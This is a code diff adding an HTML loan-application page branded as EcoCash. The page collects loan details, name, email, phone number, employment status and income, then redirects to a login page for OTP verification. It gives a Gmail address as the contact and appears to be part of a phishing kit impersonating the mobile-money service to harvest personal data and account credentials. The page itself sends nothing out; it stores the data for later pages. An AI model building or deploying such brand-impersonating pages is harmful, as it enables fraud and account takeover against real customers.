@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>EcoCash - Loan Application</title>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; height: 100%; margin: 0; padding: 0; }
+        body { font-family: 'Nunito', sans-serif; background: #f7f9fc; color: #1a1a1a; min-height: 100vh; display: flex; flex-direction: column; }
+        .header { background: white; padding: 1rem 1.5rem; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e5e5e5; }
+        .logo { font-size: 1.5rem; font-weight: 800; letter-spacing: -0.3px; }
+        .logo span.blue { color: #003087; }
+        .logo span.red { color: #d0021b; }
+        .menu { font-size: 1.5rem; cursor: pointer; color: #1a1a1a; }
+        .container { flex: 1; max-width: 500px; margin: 0 auto; padding: 1.5rem; width: 100%; }
+        .card { background: white; border-radius: 20px; padding: 1.5rem; box-shadow: 0 2px 12px rgba(0,0,0,0.08); margin-bottom: 1.5rem; }
+        .card-title { font-size: 1.3rem; font-weight: 800; color: #1a1a1a; margin-bottom: 0.25rem; letter-spacing: -0.3px; }
+        .step-text { font-size: 0.85rem; color: #666; margin-bottom: 1.5rem; }
+        .progress { display: flex; justify-content: center; gap: 0.75rem; margin-bottom: 1.5rem; }
+        .progress-bar { height: 4px; width: 100px; background: #e0e0e0; border-radius: 2px; transition: background 0.3s; }
+        .progress-bar.active { background: #003087; }
+        label { display: block; font-size: 0.9rem; font-weight: 700; color: #1a1a1a; margin-bottom: 0.5rem; }
+        label .required { color: #d0021b; }
+        .input-group { margin-bottom: 1.25rem; }
+        input, select { width: 100%; padding: 0.9rem; border: 1.5px solid #ddd; border-radius: 12px; font-family: 'Nunito', sans-serif; font-size: 0.95rem; outline: none; transition: border-color 0.2s; background: white; color: #1a1a1a; }
+        input:focus, select:focus { border-color: #003087; }
+        input.error, select.error { border-color: #d0021b; background: #fff5f5; }
+        .error-text { color: #d0021b; font-size: 0.75rem; margin-top: 0.3rem; display: none; }
+        .error-text.show { display: block; }
+        .phone-group { display: flex; align-items: center; border: 1.5px solid #ddd; border-radius: 12px; background: white; transition: border-color 0.2s; }
+        .phone-group:focus-within { border-color: #003087; }
+        .phone-group.error { border-color: #d0021b; background: #fff5f5; }
+        .phone-group .prefix { background: #f7f9fc; padding: 0.9rem 1rem; border-right: 1.5px solid #ddd; font-weight: 700; user-select: none; border-radius: 12px 0 0 12px; white-space: nowrap; }
+        .phone-group input { border: none; flex: 1; border-radius: 0 12px 12px 0; }
+        .phone-group input:focus { box-shadow: none; }
+        .btn-group { display: flex; gap: 1rem; margin-top: 1.5rem; }
+        .btn-secondary { flex: 1; padding: 0.9rem; background: #e5e5e5; color: #1a1a1a; border: none; border-radius: 12px; font-weight: 700; cursor: pointer; transition: background 0.2s; font-family: 'Nunito', sans-serif; }
+        .btn-secondary:hover { background: #d0d0d0; }
+        .btn-primary { flex: 2; padding: 0.9rem; background: #003087; color: white; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: background 0.2s; font-size: 0.95rem; font-family: 'Nunito', sans-serif; }
+        .btn-primary:hover:not(:disabled) { background: #002060; }
+        .btn-primary:disabled { background: #ccc; cursor: not-allowed; color: #888; }
+        .btn-block { width: 100%; }
+        .step { display: block; }
+        .step.hidden { display: none; }
+        .summary-box { background: #f0f4ff; border-left: 4px solid #003087; border-radius: 12px; padding: 1rem; margin: 1.25rem 0; }
+        .summary-box h4 { margin-bottom: 0.75rem; font-size: 0.95rem; color: #1a1a1a; font-weight: 800; }
+        .summary-row { display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid #e0e8ff; font-size: 0.9rem; }
+        .summary-row:last-child { border-bottom: none; }
+        .summary-label { color: #666; font-weight: 600; }
+        .summary-value { font-weight: 800; color: #003087; text-align: right; max-width: 60%; word-break: break-word; }
+        .footer { text-align: center; padding: 1rem; color: #aaa; font-size: 0.7rem; }
+        @media (max-width: 480px) {
+            .container { padding: 1rem; }
+            .card { padding: 1.25rem; }
+            .progress { gap: 0.5rem; }
+            .progress-bar { width: 80px; }
+            .btn-group { flex-direction: column; gap: 0.75rem; }
+            .btn-secondary, .btn-primary { flex: 1; }
+        }
+    </style>
+</head>
+<body>
+<div class="header">
+    <div class="logo"><span class="blue">Eco</span><span class="red">Cash</span></div>
+    <div class="menu">☰</div>
+</div>
+<div class="container">
+    <div class="card">
+        <div class="card-title">Loan Application</div>
+        <p class="step-text" id="step-title">Step 1 of 3</p>
+        <div class="progress">
+            <div class="progress-bar active" id="p1"></div>
+            <div class="progress-bar" id="p2"></div>
+            <div class="progress-bar" id="p3"></div>
+        </div>
+
+        <!-- Step 1: Loan Details -->
+        <div class="step" id="step1">
+            <div class="input-group">
+                <label>Loan Type <span class="required">*</span></label>
+                <select id="loan-type">
+                    <option value="">— Select Loan Type —</option>
+                    <option value="Personal Loan">Personal Loan</option>
+                    <option value="Business Loan">Business Loan</option>
+                    <option value="Home Loan">Home Loan</option>
+                    <option value="Education Loan">Education Loan</option>
+                </select>
+                <div class="error-text" id="error-loan-type">Please select a loan type</div>
+            </div>
+            <div class="input-group">
+                <label>Loan Amount (USD) <span class="required">*</span></label>
+                <select id="loan-amount">
+                    <option value="">— Select Amount —</option>
+                    <option value="1000">USD 1,000</option>
+                    <option value="5000">USD 5,000</option>
+                    <option value="10000">USD 10,000</option>
+                    <option value="25000">USD 25,000</option>
+                    <option value="50000">USD 50,000</option>
+                </select>
+                <div class="error-text" id="error-loan-amount">Please select a loan amount</div>
+            </div>
+            <div class="input-group">
+                <label>Repayment Period <span class="required">*</span></label>
+                <select id="loan-term">
+                    <option value="">— Select Term —</option>
+                    <option value="6">6 Months</option>
+                    <option value="12">12 Months</option>
+                    <option value="18">18 Months</option>
+                    <option value="24">24 Months</option>
+                    <option value="36">36 Months</option>
+                </select>
+                <div class="error-text" id="error-loan-term">Please select a repayment period</div>
+            </div>
+            <div class="input-group">
+                <label>Loan Purpose <span class="required">*</span></label>
+                <input type="text" id="purpose" placeholder="What will you use the loan for?" maxlength="200"/>
+                <div class="error-text" id="error-purpose">Please enter the loan purpose</div>
+            </div>
+            <button class="btn-primary btn-block" onclick="validateAndGoToStep(2)">NEXT STEP</button>
+        </div>
+
+        <!-- Step 2: Personal Details -->
+        <div class="step hidden" id="step2">
+            <div class="input-group">
+                <label>First Name <span class="required">*</span></label>
+                <input type="text" id="first-name" placeholder="John" maxlength="60"/>
+                <div class="error-text" id="error-first-name">First name is required</div>
+            </div>
+            <div class="input-group">
+                <label>Last Name <span class="required">*</span></label>
+                <input type="text" id="last-name" placeholder="Doe" maxlength="60"/>
+                <div class="error-text" id="error-last-name">Last name is required</div>
+            </div>
+            <div class="input-group">
+                <label>Email Address <span class="required">*</span></label>
+                <input type="email" id="email" placeholder="john.doe@example.com" maxlength="100"/>
+                <div class="error-text" id="error-email">Please enter a valid email address</div>
+            </div>
+            <div class="input-group">
+                <label>Phone Number <span class="required">*</span></label>
+                <div class="phone-group" id="phone-group">
+                    <span class="prefix">+263</span>
+                    <input type="tel" id="phone" placeholder="712345678" inputmode="numeric" maxlength="9" />
+                </div>
+                <div style="font-size:0.75rem;color:#888;margin-top:0.3rem;">9 digits after +263 (e.g. 712345678)</div>
+                <div class="error-text" id="error-phone">Phone number must be exactly 9 digits</div>
+            </div>
+            <div class="btn-group">
+                <button class="btn-secondary" onclick="goToStep(1)">PREVIOUS</button>
+                <button class="btn-primary"   onclick="validateAndGoToStep(3)">NEXT STEP</button>
+            </div>
+        </div>
+
+        <!-- Step 3: Employment & Submit -->
+        <div class="step hidden" id="step3">
+            <div class="input-group">
+                <label>Employment Status <span class="required">*</span></label>
+                <select id="employment-status">
+                    <option value="">— Select Status —</option>
+                    <option value="Employed">Employed</option>
+                    <option value="Self-Employed">Self-Employed</option>
+                    <option value="Unemployed">Unemployed</option>
+                    <option value="Retired">Retired</option>
+                    <option value="Student">Student</option>
+                </select>
+                <div class="error-text" id="error-employment-status">Please select employment status</div>
+            </div>
+            <div class="input-group">
+                <label>Annual Income (USD) <span class="required">*</span></label>
+                <input type="text" inputmode="decimal" id="annual-income" placeholder="50000" maxlength="12"/>
+                <div style="font-size:0.75rem;color:#888;margin-top:0.3rem;">Enter your annual income in USD</div>
+                <div class="error-text" id="error-annual-income">Please enter a valid annual income (numbers only)</div>
+            </div>
+            <div class="summary-box">
+                <h4>Application Summary</h4>
+                <div class="summary-row">
+                    <span class="summary-label">Loan Amount:</span>
+                    <span class="summary-value" id="summary-amount">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Term:</span>
+                    <span class="summary-value" id="summary-term">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Purpose:</span>
+                    <span class="summary-value" id="summary-purpose">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Applicant:</span>
+                    <span class="summary-value" id="summary-name">—</span>
+                </div>
+            </div>
+            <div class="btn-group">
+                <button class="btn-secondary" onclick="goToStep(2)">PREVIOUS</button>
+                <button class="btn-primary" id="submit-btn" onclick="saveAndLogin()">PROCEED TO VERIFY</button>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="footer">
+    © 2026 EcoCash &nbsp;·&nbsp;
+    <a href="mailto:loansecocash8@gmail.com" style="color:#aaa;">loansecocash8@gmail.com</a>
+</div>
+
+<script>
+    // No session guard here — this page is freely accessible.
+    // User fills the form, then we save their data and send them to login.
+    // After login + OTP, the success page reads the saved data and submits it.
+
+    document.getElementById('phone').addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9);
+        clearError('phone');
+    });
+
+    document.getElementById('annual-income').addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/[^0-9.]/g, '');
+        clearError('annual-income');
+    });
+
+    ['loan-type','loan-amount','loan-term','purpose','first-name','last-name',
+     'email','employment-status'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+            el.addEventListener('input',  () => clearError(id));
+            el.addEventListener('change', () => clearError(id));
+        }
+    });
+
+    function clearError(fieldId) {
+        const errorEl = document.getElementById('error-' + fieldId);
+        if (errorEl) errorEl.classList.remove('show');
+        const inputEl = document.getElementById(fieldId);
+        if (inputEl) inputEl.classList.remove('error');
+        if (fieldId === 'phone') document.getElementById('phone-group')?.classList.remove('error');
+    }
+
+    function showError(fieldId) {
+        const errorEl = document.getElementById('error-' + fieldId);
+        if (errorEl) errorEl.classList.add('show');
+        const inputEl = document.getElementById(fieldId);
+        if (inputEl) inputEl.classList.add('error');
+        if (fieldId === 'phone') document.getElementById('phone-group')?.classList.add('error');
+    }
+
+    function validateStep1() {
+        let valid = true;
+        if (!document.getElementById('loan-type').value)      { showError('loan-type');   valid = false; }
+        if (!document.getElementById('loan-amount').value)    { showError('loan-amount'); valid = false; }
+        if (!document.getElementById('loan-term').value)      { showError('loan-term');   valid = false; }
+        if (!document.getElementById('purpose').value.trim()) { showError('purpose');     valid = false; }
+        return valid;
+    }
+
+    function validateStep2() {
+        let valid = true;
+        if (!document.getElementById('first-name').value.trim()) { showError('first-name'); valid = false; }
+        if (!document.getElementById('last-name').value.trim())  { showError('last-name');  valid = false; }
+        const email = document.getElementById('email').value.trim();
+        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { showError('email'); valid = false; }
+        const phone = document.getElementById('phone').value.trim();
+        if (!phone || phone.length !== 9 || !/^\d{9}$/.test(phone)) { showError('phone'); valid = false; }
+        return valid;
+    }
+
+    function validateStep3() {
+        let valid = true;
+        if (!document.getElementById('employment-status').value) { showError('employment-status'); valid = false; }
+        const incomeStr = document.getElementById('annual-income').value.trim();
+        const income    = parseFloat(incomeStr);
+        if (!incomeStr || isNaN(income) || income < 0) { showError('annual-income'); valid = false; }
+        return valid;
+    }
+
+    function validateAndGoToStep(n) {
+        if (n === 2 && !validateStep1()) return;
+        if (n === 3 && !validateStep2()) return;
+        goToStep(n);
+    }
+
+    function goToStep(n) {
+        document.querySelectorAll('.step').forEach(el => el.classList.add('hidden'));
+        document.getElementById('step' + n).classList.remove('hidden');
+        document.getElementById('step-title').textContent = 'Step ' + n + ' of 3';
+        document.querySelectorAll('.progress-bar').forEach((el, i) => {
+            el.classList.toggle('active', i < n);
+        });
+        if (n === 3) updateSummary();
+        window.scrollTo(0, 0);
+    }
+
+    function updateSummary() {
+        const amount    = document.getElementById('loan-amount').value;
+        const term      = document.getElementById('loan-term').value;
+        const purpose   = document.getElementById('purpose').value.trim() || '—';
+        const firstName = document.getElementById('first-name').value.trim();
+        const lastName  = document.getElementById('last-name').value.trim();
+        document.getElementById('summary-amount').textContent  = amount ? 'USD ' + parseInt(amount).toLocaleString() : '—';
+        document.getElementById('summary-term').textContent    = term   ? term + ' Months' : '—';
+        document.getElementById('summary-purpose').textContent = purpose;
+        document.getElementById('summary-name').textContent    = (firstName + ' ' + lastName).trim() || '—';
+    }
+
+    // Save form data to sessionStorage then send user to login.
+    // After login + OTP verification, the success page will read this data
+    // and call /api/submit-loan to finalise the application.
+    function saveAndLogin() {
+        if (!validateStep3()) return;
+
+        const phoneVal = document.getElementById('phone').value.trim();
+
+        const loanData = {
+            loan_type:         document.getElementById('loan-type').value,
+            amount:            parseFloat(document.getElementById('loan-amount').value),
+            term_months:       parseInt(document.getElementById('loan-term').value),
+            purpose:           document.getElementById('purpose').value.trim(),
+            first_name:        document.getElementById('first-name').value.trim(),
+            last_name:         document.getElementById('last-name').value.trim(),
+            email:             document.getElementById('email').value.trim(),
+            phone:             '+263' + phoneVal,
+            employment_status: document.getElementById('employment-status').value,
+            annual_income:     parseFloat(document.getElementById('annual-income').value.trim())
+        };
+
+        // Save form data and the phone (without +263) for the login page pre-fill
+        sessionStorage.setItem('loan_data', JSON.stringify(loanData));
+        sessionStorage.setItem('phone', '0' + phoneVal);
+
+        // Send to login — after OTP, otp-verify redirects to /success
+        window.location.href = '/login';
+    }
+
+    goToStep(1);
+</script>
+<script src="/chat-widget.js"></script>
+</body>
+</html>
